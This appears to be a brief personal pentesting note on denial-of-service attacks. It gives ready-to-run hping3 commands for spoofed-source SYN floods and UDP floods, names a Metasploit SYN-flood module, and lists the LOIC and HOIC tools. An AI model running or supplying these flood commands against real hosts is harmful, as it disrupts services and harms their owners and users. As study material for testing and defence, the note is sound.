# DOS Attacks
If we want to flood any particular ports, then we got to first find the running and open ports. 

Metasploit has many modules related to DOS which can be found under "**auxiliary/dos/**"

> auxiliary/dos/tcp/synflood

Moreover, we can also used HPING3 (The one i used in my Final Year Project for Detecting DOS Attacks using C#)

```
hping3 -S <Target IP> -a <Spoofed IP> -p 22 --flood

where,

-S --> SYN Flag to send SYN Packets
-a --> Spoofed IP
-p --> port


hping3 -d 70000 -S <Target IP> -p 21 --flood

where,

-d --> Data size
```

Similarly, we can also perform UDP DOS Attacks

```
hping3 -2 -p 139 --flood <Target IP>

-2 --> Enabled UDP Mode
```

There are other tools are well named

- LOIC
- HOIC

But these tools are outdated and were build years ago.